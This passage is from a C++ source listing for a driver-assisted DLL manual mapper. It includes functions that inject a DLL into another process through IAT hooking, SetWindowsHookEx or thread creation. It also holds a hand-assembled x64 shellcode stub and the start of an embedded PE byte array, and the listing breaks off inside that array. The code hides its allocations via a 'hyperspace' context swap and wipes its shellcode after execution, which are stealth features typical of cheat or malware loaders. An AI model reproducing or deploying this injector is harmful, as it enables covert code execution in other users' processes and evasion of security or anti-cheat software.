        thunk_addr += sizeof(IMAGE_THUNK_DATA);
        original_thunk_addr += sizeof(IMAGE_THUNK_DATA);
      }
    }

    // move to next import descriptor
    import_descriptor_addr += sizeof(IMAGE_IMPORT_DESCRIPTOR);
  }

  return 0;
}

bool dll_mapper_t::execute_via_iat_hook(uint32_t pid, uint32_t tid, uintptr_t main_module_base,
                                        void* alloc_base, DWORD entry_point,
                                        driver_manager_t::alloc_mode alloc_mode) {
  debug_log("INFO", "executing DLL via IAT hook - Module: %s, Function: %s",
            hook_module ? hook_module : "NULL", hook_function ? hook_function : "NULL");

  // validate hook parameters
  if (!hook_module || !hook_function) {
    debug_log("ERROR", "IAT hook parameters not set");
    return false;
  }

  std::uintptr_t iat_entry = find_iat_entry(pid, main_module_base, hook_module, hook_function);
  if (!iat_entry) {
    debug_log("ERROR", "failed to find IAT entry for %s!%s", hook_module, hook_function);
    return false;
  }

  debug_log("INFO", "found IAT entry at 0x%llx", iat_entry);

  const auto remote_shellcode = g_driver_manager->allocate_independent_pages(
      GetCurrentProcessId(), pid, tid, 0x1000, (driver_manager_t::memory_type)0, alloc_mode);
  if (!remote_shellcode) {
    debug_log("ERROR", "failed to allocate remote shellcode");
    return false;
  }

  debug_log("INFO", "allocated remote shellcode at 0x%p", remote_shellcode);

  // swap context if using hyperspace
  if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
    if (!g_driver_manager->swap_context_to_hyperspace(tid)) {
      debug_log("ERROR", "failed to swap context to hyperspace for thread %u", tid);
      return false;
    }
    debug_log("INFO", "swapped to hyperspace context");
  }

  void* local_alloc = VirtualAlloc(NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!local_alloc) {
    debug_log("ERROR", "failed to allocate local memory: %lu", GetLastError());
    if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
      g_driver_manager->restore_context(tid);
    }
    return false;
  }

  memcpy(local_alloc, dll_main_shellcode, sizeof(dll_main_shellcode));

  std::uintptr_t shell_data_addr = (std::uintptr_t)remote_shellcode + sizeof(dll_main_shellcode);
  *(std::uintptr_t*)((std::uintptr_t)local_alloc + shell_data_offset) = shell_data_addr;

  auto ctx = (pexecution_context)((std::uintptr_t)local_alloc + sizeof(dll_main_shellcode));
  ctx->state = 0;
  ctx->base_address = (HINSTANCE)alloc_base;
  ctx->target_function = (std::uintptr_t)alloc_base + entry_point;

  // write shellcode with error handling
  if (!g_driver_manager->write_virtual_memory(pid, (std::uintptr_t)remote_shellcode, local_alloc,
                                              total_size)) {
    debug_log("ERROR", "failed to write shellcode to remote process");
    VirtualFree(local_alloc, 0, MEM_RELEASE);
    if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
      g_driver_manager->restore_context(tid);
    }
    return false;
  }

  // read and save original pointer
  void* original_ptr = nullptr;
  if (!g_driver_manager->read_virtual_memory(pid, iat_entry, &original_ptr, sizeof(uintptr_t))) {
    debug_log("ERROR", "failed to read original IAT entry");
    VirtualFree(local_alloc, 0, MEM_RELEASE);
    if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
      g_driver_manager->restore_context(tid);
    }
    return false;
  }

  debug_log("INFO", "original IAT pointer: 0x%p", original_ptr);

  // hook IAT entry
  if (!g_driver_manager->write_virtual_memory(pid, iat_entry, &remote_shellcode,
                                              sizeof(uintptr_t))) {
    debug_log("ERROR", "failed to write hook to IAT entry");
    VirtualFree(local_alloc, 0, MEM_RELEASE);
    if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
      g_driver_manager->restore_context(tid);
    }
    return false;
  }

  debug_log("INFO", "hooked IAT entry, waiting for execution");

  // wait for execution
  execution_context status_check = {0};
  const int max_wait_cycles = 1500;
  int wait_cycles = 0;

  while (status_check.state != 2 && wait_cycles < max_wait_cycles) {
    Sleep(10);
    if (!g_driver_manager->read_virtual_memory(pid, shell_data_addr, &status_check,
                                               sizeof(std::uintptr_t))) {
      debug_log("WARNING", "failed to read status at cycle %d", wait_cycles);
    }
    wait_cycles++;

    if (wait_cycles % 100 == 0) {
      debug_log("INFO", "waiting for execution... cycle %d, state: %d", wait_cycles,
                status_check.state);
    }
  }

  // restore original IAT entry
  if (!g_driver_manager->write_virtual_memory(pid, iat_entry, &original_ptr, sizeof(uintptr_t))) {
    debug_log("ERROR", "failed to restore original IAT entry - process may be unstable!");
  } else {
    debug_log("INFO", "restored original IAT entry");
  }

  // restore context if needed
  if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
    if (!g_driver_manager->restore_context(tid)) {
      debug_log("ERROR", "failed to restore context from hyperspace");
    } else {
      debug_log("INFO", "restored context from hyperspace");
    }
  }

  // clear shellcode
  std::uint8_t zero_shell[sizeof(dll_main_shellcode)] = {0};
  g_driver_manager->write_virtual_memory(pid, (std::uintptr_t)remote_shellcode, zero_shell,
                                         sizeof(zero_shell));

  VirtualFree(local_alloc, 0, MEM_RELEASE);

  bool success = (status_check.state == 2);
  debug_log(success ? "SUCCESS" : "ERROR", "IAT hook execution %s (state: %d, cycles: %d)",
            success ? "completed" : "failed/timed out", status_check.state, wait_cycles);

  return success;
}

bool dll_mapper_t::execute_via_swhk(uint32_t pid, uint32_t tid, void* alloc_base, DWORD entry_point,
                                    driver_manager_t::alloc_mode alloc_mode) {
  debug_log("INFO", "executing DLL via SetWindowsHookEx for TID %u", tid);

  const auto system_lib = reinterpret_cast<HMODULE>(LoadLibraryW(L"ntdll.dll"));
  if (!system_lib) {
    debug_log("ERROR", "failed to load ntdll.dll: %lu", GetLastError());
    return false;
  }

  const auto remote_shellcode = g_driver_manager->allocate_independent_pages(
      GetCurrentProcessId(), pid, tid, 0x1000, (driver_manager_t::memory_type)0, alloc_mode);
  if (!remote_shellcode) {
    debug_log("ERROR", "failed to allocate remote shellcode");
    return false;
  }

  debug_log("INFO", "allocated remote shellcode at 0x%p", remote_shellcode);

  if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
    if (!g_driver_manager->swap_context_to_hyperspace(tid)) {
      debug_log("ERROR", "failed to swap context to hyperspace");
      return false;
    }
    debug_log("INFO", "swapped to hyperspace context");
  }

  const auto local_alloc = VirtualAlloc(NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!local_alloc) {
    debug_log("ERROR", "failed to allocate local memory: %lu", GetLastError());
    if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
      g_driver_manager->restore_context(tid);
    }
    return false;
  }

  // setup shellcode and context
  memcpy(local_alloc, dll_main_shellcode, sizeof(dll_main_shellcode));
  const auto context_address = (uintptr_t)remote_shellcode + sizeof(dll_main_shellcode);
  *(uintptr_t*)((uintptr_t)local_alloc + shell_data_offset) = context_address;

  auto ctx = (execution_context*)((uintptr_t)local_alloc + sizeof(dll_main_shellcode));
  ctx->state = 0;
  ctx->base_address = (HINSTANCE)alloc_base;
  ctx->target_function = ((uintptr_t)alloc_base + entry_point);

  // write shellcode with error handling
  if (!g_driver_manager->write_virtual_memory(pid, (std::uintptr_t)remote_shellcode, local_alloc,
                                              total_size)) {
    debug_log("ERROR", "failed to write shellcode to remote process");
    VirtualFree(local_alloc, 0, MEM_RELEASE);
    if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
      g_driver_manager->restore_context(tid);
    }
    return false;
  }

  // install hook
  const auto message_hook =
      SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)remote_shellcode, system_lib, tid);
  if (message_hook == NULL) {
    debug_log("ERROR", "failed to install hook, error: %lu", GetLastError());
    VirtualFree(local_alloc, 0, MEM_RELEASE);
    if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
      g_driver_manager->restore_context(tid);
    }
    return false;
  }

  debug_log("INFO", "installed SetWindowsHookEx hook, waiting for execution");

  execution_context remote_ctx = {};
  const auto start_time = GetTickCount64();
  const auto timeout_ms = 15000;
  int read_failures = 0;

  while (remote_ctx.state != 2) {
    if (GetTickCount64() - start_time > timeout_ms) {
      debug_log("ERROR", "execution timeout after %lu ms", timeout_ms);
      break;
    }

    // trigger hook
    if (!PostThreadMessageA(tid, WM_NULL, 0, 0)) {
      debug_log("WARNING", "failed to post message to thread %u: %lu", tid, GetLastError());
    }

    if (!g_driver_manager->read_virtual_memory(pid, context_address, (PVOID)&remote_ctx,
                                               sizeof(execution_context))) {
      read_failures++;
      debug_log("WARNING", "failed to read context (attempt %d)", read_failures);
      if (read_failures > 10) {
        debug_log("ERROR", "too many read failures, aborting");
        break;
      }
    }

    if (remote_ctx.state != 0) {
      debug_log("DEBUG", "context state changed to: %d", remote_ctx.state);
    }

    Sleep(10);
  }

  // cleanup
  if (!UnhookWindowsHookEx(message_hook)) {
    debug_log("WARNING", "failed to unhook: %lu", GetLastError());
  }

  // clear shellcode
  std::uint8_t cleanup_buffer[sizeof(dll_main_shellcode)] = {0};
  if (!g_driver_manager->write_virtual_memory(pid, (std::uintptr_t)remote_shellcode, cleanup_buffer,
                                              sizeof(cleanup_buffer))) {
    debug_log("WARNING", "failed to clear remote shellcode");
  }

  if (alloc_mode == g_driver_manager->ALLOC_AT_HYPERSPACE) {
    if (!g_driver_manager->restore_context(tid)) {
      debug_log("ERROR", "failed to restore context from hyperspace");
    } else {
      debug_log("INFO", "restored context from hyperspace");
    }
  }

  VirtualFree(local_alloc, 0, MEM_RELEASE);

  bool success = (remote_ctx.state == 2);
  debug_log(success ? "SUCCESS" : "ERROR", "SetWindowsHookEx execution %s (final state: %d)",
            success ? "completed" : "failed", remote_ctx.state);

  return success;
}

bool dll_mapper_t::execute_via_thread(uint32_t pid, uint32_t tid, void* alloc_base,
                                      DWORD entry_point, driver_manager_t::alloc_mode alloc_mode) {
  debug_log("INFO", "executing DLL via thread creation");

  if (!g_driver_manager->execute_dll_via_thread(GetCurrentProcessId(), pid, tid, alloc_base,
                                                entry_point, alloc_mode)) {
    return false;
  }

  return true;
}

auto dll_mapper_t::run(const std::uint32_t pid, const std::uint32_t tid, void* buffer,
                       uintptr_t offsets, driver_manager_t::memory_type memory_type,
                       driver_manager_t::alloc_mode alloc_mode) -> bool {
  std::uintptr_t main_module_base = g_driver_manager->get_module_base(pid, target_module);

  if (!main_module_base) {
    debug_log("ERROR", "failed to get main module base");
    return false;
  }

  debug_log("SUCCESS", "main module base 0x%llx", main_module_base);

  const auto nt_header = get_nt_headers(reinterpret_cast<std::uintptr_t>(buffer));
  if (!nt_header) {
    debug_log("ERROR", "failed to get NT headers");
    return false;
  }

  std::size_t size = nt_header->OptionalHeader.SizeOfImage;

  debug_log("SUCCESS", "DLL size 0x%llx", size);

  auto dll_alloc_base = g_driver_manager->allocate_independent_pages(
      GetCurrentProcessId(), pid, tid, size, memory_type, alloc_mode);
  if (!dll_alloc_base) {
    debug_log("ERROR", "invalid base address");
    return false;
  }

  debug_log("SUCCESS", "allocated memory at: 0x%llx",
            reinterpret_cast<std::uintptr_t>(dll_alloc_base));

  if (!relocate_image(dll_alloc_base, buffer, nt_header)) {
    debug_log("ERROR", "image failed to relocate");
    return false;
  }

  debug_log("SUCCESS", "relocated image");

  if (!resolve_import(pid, tid, buffer, nt_header)) {
    debug_log("ERROR", "failed to resolve imports");
    return false;
  }

  debug_log("SUCCESS", "resolved imports");

  if (!map_sections(pid, dll_alloc_base, buffer, nt_header)) {
    debug_log("ERROR", "failed to map sections");
    return false;
  }

  debug_log("SUCCESS", "resolved mapped sections");

  bool execution_success = false;
  switch (exec_method) {
    case execution_method::THREAD:
      execution_success = execute_via_thread(
          pid, tid, dll_alloc_base, nt_header->OptionalHeader.AddressOfEntryPoint, alloc_mode);
      break;
    case execution_method::SET_WINDOWS_HOOK:
      execution_success = execute_via_swhk(
          pid, tid, dll_alloc_base, nt_header->OptionalHeader.AddressOfEntryPoint, alloc_mode);
      break;
    case execution_method::IAT_HOOK:
      execution_success =
          execute_via_iat_hook(pid, tid, main_module_base, dll_alloc_base,
                               nt_header->OptionalHeader.AddressOfEntryPoint, alloc_mode);
      break;
  }

  if (!execution_success) {
    debug_log("ERROR", "failed to execute DLL using %s method", get_method_name(exec_method));
    return false;
  }

  debug_log("SUCCESS", "DLL injection completed successfully using %s method",
            get_method_name(exec_method));

  return true;
}
```

`client/inject/dll_mapper.hpp`:

```hpp
#pragma once

#include <Windows.h>
#include <lmcons.h>

#include <algorithm>
#include <array>
#include <chrono>
#include <memory>
#include <string>
#include <thread>
#include <vector>

#include "driver/driver_manager.hpp"

class dll_mapper_t {
public:
  enum class execution_method {
    IAT_HOOK,
    SET_WINDOWS_HOOK,
    THREAD,
  };

public:
  void set_iat_hook_params(const char* hook_mod, const char* hook_func, const wchar_t* main_module);

  const char* get_method_name(execution_method method);

  void set_execution_method(execution_method method);

  execution_method get_execution_method() const;

  [[nodiscard]] auto run(const std::uint32_t pid, const std::uint32_t tid, void* buffer,
                         uintptr_t offsets, driver_manager_t::memory_type memory_type,
                         driver_manager_t::alloc_mode alloc_mode) -> bool;

private:
  typedef struct _execution_context {
    uint32_t state;
    std::uintptr_t target_function;
    HINSTANCE base_address;
  } execution_context, *pexecution_context;

  [[nodiscard]] auto get_nt_headers(const std::uintptr_t image_base) const -> IMAGE_NT_HEADERS*;

  [[nodiscard]] auto rva_va(const std::uintptr_t rva, IMAGE_NT_HEADERS* nt_header,
                            void* local_image) const -> void*;

  [[nodiscard]] auto relocate_image(void* remote_image, void* local_image,
                                    IMAGE_NT_HEADERS* nt_header) const -> bool;

  [[nodiscard]] auto resolve_function_address(const char* module_name,
                                              const char* function_name) const -> std::uintptr_t;

  [[nodiscard]] bool map_sections(std::uint32_t pid, void* module_base, void* local_image,
                                  IMAGE_NT_HEADERS* nt_header) const;

  [[nodiscard]] auto resolve_import(DWORD process_id, DWORD thread_id, void* local_image,
                                    IMAGE_NT_HEADERS* nt_header) const -> bool;

  uintptr_t find_iat_entry(uint32_t pid, uintptr_t module_base, const char* dll_name,
                           const char* function_name);

  bool execute_via_iat_hook(uint32_t pid, uint32_t tid, uintptr_t main_module_base,
                            void* alloc_base, DWORD entry_point,
                            driver_manager_t::alloc_mode alloc_mode);

  bool execute_via_swhk(uint32_t pid, uint32_t tid, void* alloc_base, DWORD entry_point,
                        driver_manager_t::alloc_mode alloc_mode);

  bool execute_via_thread(uint32_t pid, uint32_t tid, void* alloc_base, DWORD entry_point,
                          driver_manager_t::alloc_mode alloc_mode);

  bool execute_via_thread_hijack(uint32_t pid, uint32_t tid, void* alloc_base, DWORD entry_point,
                                 driver_manager_t::alloc_mode alloc_mode);

private:
  const char* hook_module = "user32.dll";
  const char* hook_function = "GetMessageW";
  const wchar_t* target_module = L"";
  execution_method exec_method = execution_method::IAT_HOOK;

  std::uint8_t dll_main_shellcode[92] = {
      // Function prologue - reserve stack space
      0x48, 0x83, 0xEC, 0x38,  // sub rsp, 0x38 (reserve 56 bytes on stack)

      // Load address of data structure (will be patched)
      0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00,  // mov rax, struct_addr (patched at runtime)

      // Save the structure pointer on stack
      0x48, 0x89, 0x44, 0x24, 0x20,  // mov [rsp+0x20], rax

      // Check if already executed (status != 0)
      0x48, 0x8B, 0x44, 0x24, 0x20,  // mov rax, [rsp+0x20]
      0x83, 0x38, 0x00,              // cmp dword ptr [rax], 0
      0x75, 0x39,                    // jne exit (skip if already executed)

      // Set status to 1 (executing)
      0x48, 0x8B, 0x44, 0x24, 0x20,        // mov rax, [rsp+0x20]
      0xC7, 0x00, 0x01, 0x00, 0x00, 0x00,  // mov dword ptr [rax], 1

      // Get DLL entry point address from structure
      0x48, 0x8B, 0x44, 0x24, 0x20,  // mov rax, [rsp+0x20]
      0x48, 0x8B, 0x40, 0x08,        // mov rax, [rax+8] (fn_dll_main)
      0x48, 0x89, 0x44, 0x24, 0x28,  // mov [rsp+0x28], rax

      // Prepare DllMain parameters (follows x64 calling convention)
      0x45, 0x33, 0xC0,  // xor r8d, r8d (lpReserved = NULL)
      0xBA, 0x01, 0x00, 0x00,
      0x00,  // mov edx, 1 (fdwReason = DLL_PROCESS_ATTACH)

      // Load DLL base address from structure (first parameter)
      0x48, 0x8B, 0x44, 0x24, 0x20,  // mov rax, [rsp+0x20]
      0x48, 0x8B, 0x48, 0x10,        // mov rcx, [rax+0x10] (DLL base)

      // Call the DLL entry point function
      0xFF, 0x54, 0x24, 0x28,  // call qword ptr [rsp+0x28]

      // Set status to 2 (completed)
      0x48, 0x8B, 0x44, 0x24, 0x20,        // mov rax, [rsp+0x20]
      0xC7, 0x00, 0x02, 0x00, 0x00, 0x00,  // mov dword ptr [rax], 2

      // Function epilogue and return
      0x48, 0x83, 0xC4, 0x38,  // add rsp, 0x38 (restore stack)
      0xC3,                    // ret (return to caller)

      // Padding/alignment
      0xCC  // int3 (breakpoint, used as padding)
  };

  const unsigned long shell_data_offset = 0x6;
  const uintptr_t total_size = sizeof(dll_main_shellcode) + sizeof(execution_context);
};

inline std::unique_ptr<dll_mapper_t> g_dll_mapper = std::make_unique<dll_mapper_t>();
```

`client/inject/dll_shell.h`:

```h
#pragma once

unsigned char dll_shell[10752] = {
	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF8, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
	0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70,
	0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
	0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20,
	0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
	0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2B, 0x83, 0xAF, 0x94,
	0x6F, 0xE2, 0xC1, 0xC7, 0x6F, 0xE2, 0xC1, 0xC7, 0x6F, 0xE2, 0xC1, 0xC7,
	0x66, 0x9A, 0x52, 0xC7, 0x6D, 0xE2, 0xC1, 0xC7, 0x54, 0xBC, 0xC0, 0xC6,
	0x6D, 0xE2, 0xC1, 0xC7, 0x54, 0xBC, 0xC2, 0xC6, 0x6D, 0xE2, 0xC1, 0xC7,
	0x54, 0xBC, 0xC4, 0xC6, 0x66, 0xE2, 0xC1, 0xC7, 0x54, 0xBC, 0xC5, 0xC6,
	0x66, 0xE2, 0xC1, 0xC7, 0xB2, 0x1D, 0x0A, 0xC7, 0x6A, 0xE2, 0xC1, 0xC7,
	0x6F, 0xE2, 0xC0, 0xC7, 0x4E, 0xE2, 0xC1, 0xC7, 0xF8, 0xBC, 0xC8, 0xC6,
	0x6E, 0xE2, 0xC1, 0xC7, 0xF8, 0xBC, 0xC1, 0xC6, 0x6E, 0xE2, 0xC1, 0xC7,
	0xFD, 0xBC, 0x3E, 0xC7, 0x6E, 0xE2, 0xC1, 0xC7, 0xF8, 0xBC, 0xC3, 0xC6,
	0x6E, 0xE2, 0xC1, 0xC7, 0x52, 0x69, 0x63, 0x68, 0x6F, 0xE2, 0xC1, 0xC7,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00,
	0x64, 0x86, 0x07, 0x00, 0x73, 0x7B, 0xA7, 0x5A, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x20, 0x0B, 0x02, 0x0E, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF0, 0x13, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
	0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x60, 0x01, 0x00, 0x00, 0x10, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
	0xD0, 0x26, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x38, 0x27, 0x00, 0x00,
	0x64, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0xE0, 0x01, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0xC8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
	0xA0, 0x21, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x22, 0x00, 0x00,
	0x94, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x20, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
	0x74, 0x00, 0x00, 0x00, 0x43, 0x0F, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60,
	0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x70, 0x0B, 0x00, 0x00,
	0x00, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x40, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00,
	0x40, 0x06, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
	0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0, 0x2E, 0x70, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0xC8, 0x01, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
	0x00, 0x02, 0x00, 0x00, 0x00, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
	0x2E, 0x67, 0x66, 0x69, 0x64, 0x73, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
	0x00, 0x50, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x40, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x00, 0x00, 0x00,
	0xE0, 0x01, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
	0x00, 0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x2E, 0x72, 0x65, 0x6C,
	0x6F, 0x63, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00,
	0x00, 0x02, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x28, 0x45, 0x33, 0xC9, 0x4C,
	0x8D, 0x05, 0x6A, 0x11, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x73, 0x11, 0x00,
	0x00, 0x33, 0xC9, 0xFF, 0x15, 0x63, 0x10, 0x00, 0x00, 0x33, 0xC0, 0x48,
	0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0x83, 0xFA, 0x01, 0x75,
	0x1F, 0x33, 0xC0, 0x4C, 0x8D, 0x05, 0xBE, 0xFF, 0xFF, 0xFF, 0x48, 0x89,
	0x44, 0x24, 0x28, 0x45, 0x33, 0xC9, 0x33, 0xD2, 0x89, 0x44, 0x24, 0x20,
	0x33, 0xC9, 0xFF, 0x15, 0xA8, 0x0F, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x3B, 0x0D, 0x79, 0x1F, 0x00, 0x00, 0xF2, 0x75, 0x12, 0x48, 0xC1,
	0xC1, 0x10, 0x66, 0xF7, 0xC1, 0xFF, 0xFF, 0xF2, 0x75, 0x02, 0xF2, 0xC3,
	0x48, 0xC1, 0xC9, 0x10, 0xE9, 0xC3, 0x03, 0x00, 0x00, 0xCC, 0xCC, 0xCC,
